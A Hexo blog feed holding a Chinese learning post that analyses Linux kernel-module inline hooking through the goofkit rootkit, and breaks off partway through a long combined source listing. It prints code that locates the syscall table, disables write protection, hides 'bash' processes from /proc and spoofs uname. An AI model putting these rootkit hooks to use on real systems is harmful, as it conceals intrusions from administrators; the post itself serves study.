<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-08-02T03:53:20.913Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux下基于lkm的inline hook学习</title>
    <link href="http://yoursite.com/2020/08/02/Linux%E4%B8%8B%E5%9F%BA%E4%BA%8Elkm%E7%9A%84inline-hook%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2020/08/02/Linux%E4%B8%8B%E5%9F%BA%E4%BA%8Elkm%E7%9A%84inline-hook%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-08-02T03:51:06.000Z</published>
    <updated>2020-08-02T03:53:20.913Z</updated>
    
    <content type="html"><![CDATA[<p>最基础的几种 hook 方式，后面还有很多。主要参考<a href="https://github.com/g0dA/linuxStack/blob/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87.md#ring0-inline-hook" target="_blank" rel="noopener">文章</a>。</p><h2 id="主要原理"><a href="#主要原理" class="headerlink" title="主要原理"></a>主要原理</h2><p>通过修改目标函数的起始汇编，使用 jmp 指令跳转到我们 hook 的函数地址，在执行完 hook 函数后或者期间，在跳转回原函数地址。<br>我们选择目标函数的起始点做修改，而不选择后面做修改，因为这样，我们 hook 函数，可以正确寻找到调用目标函数所赋值的参数，寻参是通过 ebp 相对位置寻找的。</p><h2 id="主要操作"><a href="#主要操作" class="headerlink" title="主要操作"></a>主要操作</h2><ol><li>备份前几条汇编指令（可选）</li><li>计算跳转</li><li>修改目标函数前几条指令，及后续 hook 跳转回目标函数指令（后面部分可选）<br>找了一个开源的实现 inline hook 的<a href="https://github.com/RITRedteam/goofkit" target="_blank" rel="noopener">项目</a>，分析一下</li></ol><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先看他的一个 hook 数据结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Hook</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">//用于多个hook对象时寻找的索引。</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> id;</span><br><span class="line"><span class="comment">//要备份的汇编指令长度</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> hook_len;</span><br><span class="line"><span class="comment">//要备份的汇编指令内容</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *original_code;</span><br><span class="line"><span class="comment">//目标函数需要修改为的汇编指令内容</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *hook;</span><br><span class="line"><span class="comment">//hook函数结尾的汇编指令</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *trampoline;</span><br><span class="line"><span class="comment">//目标函数的地址</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *og_func;</span><br><span class="line"><span class="comment">//hook函数的地址</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *new_func;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> paused;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们最终所需要的信息都在这个数据结构中。<br>首先获取系统调用表(<a href="https://limxw.com/posts/linux-kernel-practice-hijack-syscall/" target="_blank" rel="noopener">原理</a>)，(注: <code>在 Linux 内核 v4.17及之后 sys_close 就不再被导出</code>)：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> *<span class="title">find</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *sctable;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> i = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span>)sys_close;</span><br><span class="line"><span class="keyword">while</span> (i &lt; ULONG_MAX)</span><br><span class="line">&#123;</span><br><span class="line">sctable = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)i;</span><br><span class="line"><span class="keyword">if</span> (sctable[__NR_close] == (<span class="keyword">unsigned</span> <span class="keyword">long</span>)sys_close)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> sctable;</span><br><span class="line">&#125;</span><br><span class="line">i += <span class="keyword">sizeof</span>(<span class="keyword">void</span> *);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后通过系统调用表获取相应的调用。如果我们修改 hook 内核中一些函数，那么我们可以通过 kallsyms 来获取。通过查阅 <code>/proc/kallsyms</code> 是包含所有内核符号表及其动态加载的符号表，也可以通过 <code>kallsyms_lookup_name</code> 来获取符号的地址。<br>接下来是获取备份汇编指令的长度：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">number_of_bytes_to_pad_jump</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">DISASM MyDisasm;</span><br><span class="line"><span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> Error = <span class="number">0</span>;</span><br><span class="line">(<span class="keyword">void</span>)<span class="built_in">memset</span>(&amp;MyDisasm, <span class="number">0</span>, <span class="keyword">sizeof</span>(DISASM));</span><br><span class="line">MyDisasm.EIP = src;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span> &amp;&amp; res &lt; HOOK_LEN; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//反汇编，每次返回一条汇编指令长度。</span></span><br><span class="line">len = Disasm(&amp;MyDisasm);</span><br><span class="line">printk(<span class="string">"len: %d\n"</span>, len);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; len; j++)</span><br><span class="line">&#123;</span><br><span class="line">printk(<span class="string">"%02x "</span>, *(((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)MyDisasm.EIP) + j));</span><br><span class="line">&#125;</span><br><span class="line">res += len;</span><br><span class="line">MyDisasm.EIP = MyDisasm.EIP + len;</span><br><span class="line">printk(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它使用来 <a href="https://github.com/BeaEngine/beaengine" target="_blank" rel="noopener">beaengine</a> ，查阅之后了解到他是一个反汇编工具，问了一下大锤，上述代码的核心功能是通过 beaengine 来进行反汇编，每次返回一条汇编指令长度。这里的条件就是在汇编指令小于 12 条且总长度小于 HOOK_LEN，这里就是刚刚指令总长大于 HOOK_LEN 的长度。<br>接着就是核心函数 <code>create_tramp</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> *<span class="title">create_tramp</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> *src, <span class="keyword">unsigned</span> <span class="keyword">long</span> *new_func, <span class="keyword">unsigned</span> <span class="keyword">int</span> id, <span class="keyword">unsigned</span> <span class="keyword">int</span> h_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">printk(<span class="string">"[goof] hooking %p with %p\n"</span>, src, new_func);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *tmp = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)src;</span><br><span class="line"><span class="comment">//初始化hook结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Hook</span> *<span class="title">h</span> = <span class="title">kmalloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">Hook</span>), <span class="title">GFP_KERNEL</span>);</span></span><br><span class="line">hooks[id] = h;</span><br><span class="line">h-&gt;og_func = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)src;</span><br><span class="line">h-&gt;new_func = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)new_func;</span><br><span class="line"><span class="comment">//h_len为需要备份的汇编长度</span></span><br><span class="line">h-&gt;hook_len = h_len;</span><br><span class="line"><span class="comment">//申请h_len长度的内存资源</span></span><br><span class="line">h-&gt;original_code = kmalloc(h-&gt;hook_len, GFP_KERNEL);</span><br><span class="line"><span class="comment">//拷贝目标的h_len长度的内容备份到h-&gt;original_code中，完成备份</span></span><br><span class="line"><span class="built_in">memcpy</span>(h-&gt;original_code, src, h-&gt;hook_len);</span><br><span class="line"><span class="comment">//申请h_len+HOOK_LEN长度的内存资源，其中h_len用于存在备份内容，HOOK_len用于存放hook jump。</span></span><br><span class="line">h-&gt;trampoline = __vmalloc(h-&gt;hook_len + HOOK_LEN, GFP_KERNEL, PAGE_KERNEL_EXEC);</span><br><span class="line"><span class="comment">//存放备份内容</span></span><br><span class="line"><span class="built_in">memcpy</span>(h-&gt;trampoline, h-&gt;original_code, h-&gt;hook_len);</span><br><span class="line"><span class="comment">//这是JUMP_TEMPLATE的内容</span></span><br><span class="line"><span class="comment">// Code used to jump to arbitrary addresses</span></span><br><span class="line"><span class="comment">//  movabs rax,0x1122334455667788</span></span><br><span class="line"><span class="comment">//  mov    rax,rax</span></span><br><span class="line"><span class="comment">//  jmp    rax</span></span><br><span class="line"><span class="comment">//将JUMP_TEMPLATE的内容拷贝到h-&gt;trampoline的后HOOK_LEN空间</span></span><br><span class="line"><span class="comment">//同时在后面将 目标地址+h_len 作为后续hook函数回跳的地址，将它替换到JUMP_TEMPLATE的movabs rax</span></span><br><span class="line"><span class="comment">//后面跟的地址，8位，用户后续跳转会原执行点。</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *jump_back = kmalloc(HOOK_LEN, GFP_KERNEL);</span><br><span class="line"><span class="built_in">memcpy</span>(jump_back, JUMP_TEMPLATE, HOOK_LEN);</span><br><span class="line">tmp = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)src + h-&gt;hook_len;</span><br><span class="line"><span class="built_in">memcpy</span>(jump_back + <span class="number">2</span>, &amp;tmp, <span class="number">8</span>);</span><br><span class="line"><span class="comment">//这里感觉有问题，后面应该拷贝的 HOOK_LEN长度？？？后续实际测试的时候调试一下。</span></span><br><span class="line"><span class="built_in">memcpy</span>(h-&gt;trampoline + h-&gt;hook_len, jump_back, h-&gt;hook_len)</span><br><span class="line"><span class="comment">//释放资源，完成了对 h-&gt;trampoline的内容准备。</span></span><br><span class="line">kfree(jump_back);</span><br><span class="line">printk(<span class="string">"\n[goof] trampoline %p\n\t[goof] "</span>, h-&gt;trampoline);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; h-&gt;hook_len * <span class="number">2</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">printk(<span class="string">"%02x "</span>, h-&gt;trampoline[i]);</span><br><span class="line">&#125;</span><br><span class="line">printk(<span class="string">"\n"</span>);</span><br><span class="line"><span class="comment">//申请h_len长度的内存资源，用于替换掉备份的汇编指令</span></span><br><span class="line"><span class="comment">//内容为JUMP_TEMPLATE，用于跳转到hook函数起始地址，所以将地址替换为hook函数的地址。</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *jump = kmalloc(h-&gt;hook_len, GFP_KERNEL);</span><br><span class="line"><span class="built_in">memset</span>(jump, <span class="number">0x90</span>, h-&gt;hook_len);</span><br><span class="line"><span class="built_in">memcpy</span>(jump, JUMP_TEMPLATE, HOOK_LEN);</span><br><span class="line">tmp = ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)new_func);</span><br><span class="line"><span class="built_in">memcpy</span>(jump + <span class="number">2</span>, &amp;tmp, <span class="number">8</span>);</span><br><span class="line">printk(<span class="string">"[goof] Memory hasn't been written\n"</span>);</span><br><span class="line"><span class="comment">//关掉写保护</span></span><br><span class="line">DISABLE_W_PROTECTED_MEMORY</span><br><span class="line"><span class="comment">//替换为构造的jump指令</span></span><br><span class="line"><span class="built_in">memcpy</span>(src, jump, h-&gt;hook_len);</span><br><span class="line"><span class="comment">//开启写保护</span></span><br><span class="line">ENABLE_W_PROTECTED_MEMORY</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于写保护的<a href="https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/linux_rootkit/sys_call_table.html" target="_blank" rel="noopener">资料</a>。</p><p>再看 hook 函数，由于此开源项目我没有跑起来，每次加载都会崩掉，猜测是因为调用表获取的问题，所以先看看边城给出的代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">new_proc_pid_readdir</span><span class="params">(struct file *file, struct dir_context *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">for</span> (iter = new_next_tgid(ns, iter);</span><br><span class="line"> iter.task;</span><br><span class="line"> iter.tgid += <span class="number">1</span>, iter = new_next_tgid(ns, iter))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> name[PROC_NUMBUF];</span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line">cond_resched();</span><br><span class="line"><span class="keyword">if</span> (!new_has_pid_permissions(ns, iter.task, HIDEPID_INVISIBLE))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">len = <span class="built_in">snprintf</span>(name, <span class="keyword">sizeof</span>(name), <span class="string">"%d"</span>, iter.tgid);</span><br><span class="line">ctx-&gt;pos = iter.tgid + TGID_OFFSET;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">"bash"</span>, iter.task-&gt;comm) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">printk(<span class="string">"Hidden process is [tgid:%d][pid:%d]:%s\n"</span>, ctx-&gt;pos, iter.task-&gt;pid, iter.task-&gt;comm);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!new_proc_fill_cache(file, ctx, name, len,</span><br><span class="line"> new_proc_pid_instantiate, iter.task, <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">put_task_struct(iter.task);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ctx-&gt;pos = PID_MAX_LIMIT + TGID_OFFSET;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过直接对比源码中的 <code>proc_pid_readdir</code> ，增加了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">"bash"</span>, iter.task-&gt;comm) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">printk(<span class="string">"Hidden process is [tgid:%d][pid:%d]:%s\n"</span>, ctx-&gt;pos, iter.task-&gt;pid, iter.task-&gt;comm);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出是对 command 为 bash 的进程做了过滤，不让他存在 /proc 目录中来进行进程的隐藏，所以后续，可以对内核任意函数进行同种方法的 hook。因为边城的 hook，并没有跳转会原函数的操作，而是做了类似直接替换原函数的操作，做的备份也只是用于后续的恢复，所以在对 hook 函数的编程中，要保证在指定点操作，就需要将之前的操作都重写一遍，当然可以导出的函数，就可以直接引用。<br>再看 goof 给出的 hook 代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">new_sys_newuname</span><span class="params">(struct utsname *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//这里他给出的备注是，先调用原sys_uname来对buf进行数据填充，这里trampoline就是备份数据加</span></span><br><span class="line"><span class="comment">//jmp 回跳。</span></span><br><span class="line"><span class="keyword">int</span> (*func_ptr)(struct utsname *) = (<span class="keyword">void</span> *)hooks[<span class="number">0</span>]-&gt;trampoline;</span><br><span class="line"><span class="keyword">int</span> ret = func_ptr(buf);</span><br><span class="line"><span class="keyword">char</span> tmp[] = <span class="string">"Macos"</span>;</span><br><span class="line">copy_to_user(buf-&gt;sysname, tmp, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的操作就表现来 trampoline 的作用。（系统调用大多都是汇编，直接改写现在我也不会。）</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>边城给的实例代码是最原始的，可以直接运行，非常爽。goof 实现的更完整，但是我跑不起来，而且只能对系统调用表的系统调用函数进行修改，所以我就搬运了一下，将备份模块和替换操作模块都搬运到边城给的原始代码中，这两个部分 goof 写的更完善。代码贴在最后面。效果：<br><img src="http://l0ca1-blog.oss-cn-beijing.aliyuncs.com/imgs/5b241dc4-084c-484d-8031-37484ef6c824.png" alt="Untitled"><br>后续需要多看看 linux 下重要操作所涉及的源码。<br>修改 uname 系统调用，效果就很简单：<br><img src="http://l0ca1-blog.oss-cn-beijing.aliyuncs.com/imgs/79ba5745-ae1a-4332-8f84-cc047342fff8.png" alt="Untitled 1"><br>我该如何用 gdb 调试到 proc_pid_readdir 或者系统调用 sys_newuname，来看看是否是真的以想象的流程运行的？这个放在后面文章中来学习，应该是需要构造 linux 虚拟机进行调试，边城的资料中有给出。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>边城的代码+goof 的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"goof.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"include/beaengine/BeaEngine.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"beaengineSources/BeaEngine.c"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FIRST_PROCESS_ENTRY 256</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROC_NUMBUF 13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TGID_OFFSET (FIRST_PROCESS_ENTRY + 2)</span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"CHS"</span>);</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="keyword">int</span> <span class="title">instantiate_t</span><span class="params">(struct inode *, struct dentry *,</span></span></span><br><span class="line"><span class="function"><span class="params">  struct task_struct *, <span class="keyword">const</span> <span class="keyword">void</span> *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> struct <span class="title">tgid_iter</span> <span class="params">(*hack_next_tgid)</span><span class="params">(struct pid_namespace *ns, struct tgid_iter iter)</span></span>;</span><br><span class="line">hack_next_tgid new_next_tgid;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*hack point*/</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">bool</span> <span class="params">(*hack_proc_fill_cache)</span><span class="params">(struct file *file, struct dir_context *ctx,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">int</span> len,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">instantiate_t</span> instantiate, struct task_struct *task, <span class="keyword">const</span> <span class="keyword">void</span> *ptr)</span></span>;</span><br><span class="line">hack_proc_fill_cache new_proc_fill_cache;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*hack_proc_pid_instantiate)</span><span class="params">(struct inode *dir,</span></span></span><br><span class="line"><span class="function"><span class="params"> struct dentry *dentry,</span></span></span><br><span class="line"><span class="function"><span class="params"> struct task_struct *task, <span class="keyword">const</span> <span class="keyword">void</span> *ptr)</span></span>;</span><br><span class="line">hack_proc_pid_instantiate new_proc_pid_instantiate;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">bool</span> <span class="params">(*hack_ptrace_may_access)</span><span class="params">(struct task_struct *task, <span class="keyword">unsigned</span> <span class="keyword">int</span> mode)</span></span>;</span><br><span class="line">hack_ptrace_may_access new_ptrace_may_access;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span 